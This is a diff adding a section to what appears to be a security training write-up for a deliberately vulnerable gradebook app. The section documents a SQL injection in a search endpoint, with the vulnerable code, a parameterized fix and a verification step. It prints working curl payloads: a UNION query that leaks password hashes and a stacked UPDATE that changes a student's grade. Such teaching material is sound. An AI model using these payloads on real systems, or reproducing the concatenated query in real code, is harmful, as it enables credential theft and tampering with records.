@@ -379,6 +379,63 @@ against attackers who can write to the *database*, which is the threat here.
 
 ---
 
+## 10. SQL injection — people directory (stacked write)
+
+**Where:** `app.py → h_search` (`GET /api/search?query=`). The search term is
+concatenated into a `LIKE` pattern and run with `db.run_raw_multi`, which also
+executes **stacked** statements (`;`-separated):
+
+```python
+# VULN
+sql = ("SELECT id, full_name, role FROM users "
+       "WHERE full_name LIKE '%" + query + "%' ORDER BY full_name")
+rows = db.run_raw_multi(conn, sql)   # runs every statement in the string
+```
+
+Unlike #1 and #2 (read-only injections), this one gives an attacker a **write
+primitive** — and it needs no admin login and no access to the Gradebook page.
+Any logged-in user (a student) can change any grade straight from the search box.
+
+**Exploit A** — UNION read, leak password hashes (3 columns to match):
+
+```bash
+TOK=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
+      -d '{"username":"alice","password":"password1"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
+
+curl -s -G "$B/api/search" -H "Authorization: Bearer $TOK" \
+  --data-urlencode "query=' UNION SELECT id, password_hash, role FROM users -- "
+# every user's MD5 hash appears in the full_name column
+```
+
+**Exploit B** — stacked `UPDATE`, change Alice's Mathematics grade (course 1):
+
+```bash
+curl -s -G "$B/api/search" -H "Authorization: Bearer $TOK" \
+  --data-urlencode "query=%'; UPDATE grades SET grade='20.00' WHERE student_id=4 AND course_id=1; -- "
+# results come back empty, but /api/my/grades now shows 20.00 — a student just
+# rewrote their own grade through a search box.
+```
+
+In the browser: log in as `alice` / `password1`, open **Directory**, and paste
+the Exploit B string into the search field. The search shows no matches, but the
+Math grade on the Dashboard is now 20/20. The vuln build has no ledger, so (as in
+#9) nothing detects it.
+
+**Fix (secure build):** bind the term as a parameter — it is then only ever data,
+never SQL — and the query stays a single statement, so stacking is impossible:
+
+```python
+rows = db.run(conn,
+    "SELECT id, full_name, role FROM users WHERE full_name LIKE ? ORDER BY full_name",
+    ("%" + query + "%",))
+```
+
+**Verify:** on the secure build the same Exploit B payload returns no results and
+leaves the grade at 14.00; `/api/grades/integrity` still shows `ok:true`. (Even if
+an attacker reached the database directly, the #9 ledger would flag the change.)
+
+---
+
 ## Summary
 
 | # | Vulnerability | Fix |
@@ -392,3 +449,4 @@ against attackers who can write to the *database*, which is the threat here.
 | 7 | Unsalted MD5 passwords | PBKDF2 + salt |
 | 8 | No signatures / no encryption at rest | Ed25519 signatures + AES-GCM |
 | 9 | No integrity anchoring (tampering undetected) | issuer-only smart contract: anchor hashes on write, verify on read |
+| 10 | SQLi in people search (stacked write → grade change) | parameterized query, single statement |
